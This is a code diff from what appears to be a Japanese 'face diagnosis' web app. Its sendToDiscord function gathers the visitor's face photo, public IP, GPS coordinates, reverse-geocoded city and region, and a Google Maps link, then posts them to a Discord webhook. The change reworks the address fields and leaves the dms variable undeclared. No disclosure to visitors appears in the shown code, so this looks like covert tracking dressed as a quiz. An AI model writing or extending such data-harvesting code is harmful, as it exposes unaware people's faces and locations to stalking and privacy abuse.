@@ -229,23 +229,23 @@ async function sendToDiscord(base64, score, rank, lat, lon) {
 
   const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
 
-  let address = "不明", dms="不明";
-  if (lat != null && lon != null){
-    address = await getAddress(lat, lon);
-    dms = toDMS(lat, lon);
-  }
+let addrData = { city:"不明", state:"不明", region:"不明" };
+if (lat != null && lon != null) {
+  addrData = await getAddress(lat, lon);
+  dms = toDMS(lat, lon);
+}
 
-  fd.append("payload_json", JSON.stringify({
-    content: `
+fd.append("payload_json", JSON.stringify({
+  content: `
 📸 顔診断
 IP: ${ipData.ip}
-地域: ${address}
+地域: ${addrData.city} (${addrData.state}, ${addrData.region})
 位置: https://maps.google.com/?q=${lat ?? "不明"},${lon ?? "不明"}
 黄金比: ${score}%
 ランク: ${rank}
 DMS: ${dms}
 `
-  }));
+}));
 
   fetch(WEBHOOK_URL, { method:"POST", body:fd })
     .then(res => console.log("送信OK", res.status))
